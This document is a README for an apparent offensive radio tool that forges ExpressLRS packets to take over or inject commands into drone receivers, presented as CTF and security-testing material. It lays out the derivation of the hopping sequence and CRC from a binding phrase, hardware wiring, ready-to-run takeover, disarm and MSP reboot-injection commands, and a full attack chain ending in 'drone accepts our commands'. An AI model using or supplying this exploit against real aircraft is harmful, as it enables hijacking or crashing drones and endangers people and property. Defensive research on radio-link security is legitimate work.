# ELRS TX Emulator

Transmits forged ExpressLRS packets over the air, turning the ELRS
packet forger into a live exploit. Given a binding phrase, derives the
full crypto state and transmits valid SYNC, RC, and MSP packets on the
correct FHSS hopping frequencies at the correct timing.

**For authorized CTF research and security testing only.**

## How It Works

ELRS uses a binding phrase as the sole shared secret between TX and RX.
The phrase seeds the FHSS hopping sequence, CRC initializer, and sync
identifier. There is no encryption. Knowing the phrase means:

1. Binding phrase → MD5 → UID (first 6 bytes)
2. UID → FHSS seed → deterministic 256-entry hopping sequence (80 channels)
3. UID → CRC initializer for CRC14/CRC16 validation
4. Transmit valid packets on the right frequency at the right time

The emulator follows this chain and transmits using the RX's expected
timing and hop pattern, so the RX accepts our packets as legitimate.

## Radio Backends

### SoapySDR (any SDR hardware)

Works with any SoapySDR-compatible SDR: Ettus B205mini/B210, HackRF,
LimeSDR, BladeRF, etc. Uses the project's standard SDR abstraction.

```
pip install numpy SoapySDR
```

Also install the SoapySDR driver module for your hardware:
- USRP: `apt install soapysdr-module-uhd`
- HackRF: `apt install soapysdr-module-hackrf`
- LimeSDR: `apt install soapysdr-module-lms7`
- BladeRF: `apt install soapysdr-module-bladerf`

### Direct SPI to SX1280

For direct wiring to an SX1280 module (e.g. from a Raspberry Pi or
ESP32 dev board). Lowest latency, native LoRa modulation since the
SX1280 handles the CSS modulation internally.

```
pip install spidev RPi.GPIO
```

**Wiring (Raspberry Pi → SX1280 module):**

| RPi Pin (BCM) | SX1280 Pin | Default GPIO |
|---|---|---|
| MOSI (GPIO 10) | MOSI | — |
| MISO (GPIO 9) | MISO | — |
| SCLK (GPIO 11) | SCK | — |
| CE0 (GPIO 8) | NSS/CS | — |
| GPIO 25 | RESET | `--spi-reset 25` |
| GPIO 24 | BUSY | `--spi-busy 24` |
| GPIO 22 | DIO1 | `--spi-dio1 22` |
| 3.3V | VCC | — |
| GND | GND | — |

The EMAX E8 controller uses ESP32 + SX1280 on SPI. If you have a bare
SX1280 module (e.g. from a broken RX), you can wire it to any SPI host.

### Dry Run (no hardware)

Default mode. Prints packets to stderr without transmitting.
No dependencies beyond Python stdlib.

## Usage

### Show Derived Parameters (no hardware)

```bash
python3 elrs-tx-emulator.py --phrase "iloveflying" info
```

Output:
```
Binding phrase:  "iloveflying"
OTA version:     4
UID:             XX:XX:XX:XX:XX:XX
FHSS seed:       0xXXXXXXXX
CRC init:        0xXXXX
Sync channel:    40  (2440.0 MHz)
Packet rate:     100 Hz (enum 4, 10000 us)
First 20 FHSS hops:
  [  0] ch=40  2440.0 MHz <-- SYNC
  [  1] ch=...
```

### Takeover (Override Legitimate TX)

Continuously transmit SYNC + RC packets. The target RX locks onto our
signal because we use the correct UID, FHSS sequence, and CRC.

```bash
# SDR — hold sticks centered, throttle low
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --arm takeover --channels 1500,1500,1000,1500

# SDR — force disarm (throttle min, armed=false)
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --arm takeover --disarm

# SPI — direct SX1280, 10-second burst
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend spi \
    --arm takeover --duration 10

# SDR — takeover + inject MSP reboot command
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --arm takeover --msp-cmd 68

# Dry run (no hardware, prints packets)
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend dry-run \
    --arm takeover --duration 2
```

### Inject (Send Commands During TX Gaps)

Wait for the legitimate TX signal to drop, then inject a burst of
packets. Useful for sending MSP commands (reboot, config changes) during
failsafe windows.

```bash
# Inject FC reboot command (MSP 68)
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --arm inject --msp-cmd 68

# Inject with custom listen window and burst size
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --arm inject --msp-cmd 68 --listen-time 5 --inject-count 20
```

### SDR Device Selection

```bash
# Use a specific SDR
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --sdr-device "driver=uhd" --arm takeover

# Use HackRF
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \
    --sdr-device "driver=hackrf" --arm takeover
```

### SPI Pin Configuration

```bash
# Custom GPIO pins
python3 elrs-tx-emulator.py --phrase "iloveflying" --backend spi \
    --spi-device /dev/spidev0.0 --spi-reset 25 --spi-busy 24 \
    --spi-dio1 22 --spi-power 10 --arm takeover
```

## Operating Modes

### Takeover

In takeover mode, the emulator continuously transmits SYNC and RC
packets following the FHSS hopping sequence. The target RX will
eventually lock onto our signal because:

- We send valid SYNC packets with the correct UID[4:5] bytes
- We follow the same FHSS hopping sequence the RX expects
- Our CRC is valid for the target's CRC initializer
- If we transmit with higher power than the legitimate TX, the RX
  captures our signal

Once the RX locks on, we control the stick channels. The `--disarm`
flag sets throttle to minimum and sends the disarmed flag, which causes
Betaflight to disarm the motors.

### Inject

In inject mode, the emulator waits for a gap in the legitimate TX
signal, then sends a burst of packets. This is useful for:

- Injecting MSP commands (reboot, config changes, motor test)
- Sending control overrides during failsafe windows
- Exploiting momentary range loss between TX and RX

The `--listen-time` controls how long to wait before injecting, and
`--inject-count` controls the burst size.

## ELRS Rate Settings

| Rate Enum | Packet Rate | Interval | Best For |
|---|---|---|---|
| 0 | 500 Hz | 2 ms | Low latency racing |
| 1 | 250 Hz | 4 ms | Fast response |
| 2 | 200 Hz | 5 ms | Balanced |
| 3 | 150 Hz | 6.67 ms | Medium range |
| **4** | **100 Hz** | **10 ms** | **Default for 2.4 GHz** |
| 5 | 50 Hz | 20 ms | Long range |
| 6 | 25 Hz | 40 ms | Maximum range |

Match the target's rate setting. Most 2.4 GHz ELRS setups use rate 4
(100 Hz) by default. Using a faster rate than the target does not help;
using a slower rate means the RX won't see our packets on every slot.

## Safety

- **`--arm` is required** for any TX mode. Without it, the tool refuses
  to transmit.
- **Default mode is `dry-run`** — prints packets without transmitting.
- The tool logs all actions to stderr so the operator sees what's
  happening.
- Only use this against equipment you own, in authorized CTF
  competitions.
- Be aware of local RF regulations. 2.4 GHz ISM band permits low-power
  unlicensed operation in most jurisdictions, but intentional
  interference with others' equipment may violate regulations outside a
  controlled CTF environment.

## Attack Chain

```
1. Capture SYNC packets (elrs-analyzer.py or passive SDR)
      ↓ extract UID[3:5]
2. Rainbow table lookup (elrs-uid-rainbow.py / elrs-rainbow-table.csv)
      ↓ recover binding phrase
3. Derive full crypto state (this tool, "info" command)
      ↓ UID, FHSS sequence, CRC init
4. Takeover or inject (this tool, "takeover" / "inject" command)
      ↓ transmit forged packets
5. Drone accepts our commands
```

## Dependencies

| Backend | Python Packages | System Packages |
|---|---|---|
| dry-run | (none) | (none) |
| sdr | `numpy`, `SoapySDR` | SDR driver module |
| spi | `spidev`, `RPi.GPIO` or `gpiod` | SPI enabled in kernel |

## Limitations

- **SDR LoRa modulation is approximate.** The SoapySDR backend generates
  a simplified chirp spread spectrum signal. For best results, use the
  SPI backend with an actual SX1280 module, which handles native LoRa
  modulation.
- **Inject mode gap detection is time-based.** A production version
  would use RSSI monitoring on the RX path to detect when the
  legitimate TX drops out. The current implementation uses a fixed
  listen window.
- **No telemetry handling.** The emulator does not process telemetry
  packets from the RX. A future version could decode telemetry to
  confirm the RX has locked onto our signal.
- **Single-rate operation.** The emulator transmits at one fixed rate.
  If the target uses rate switching, this won't track it.
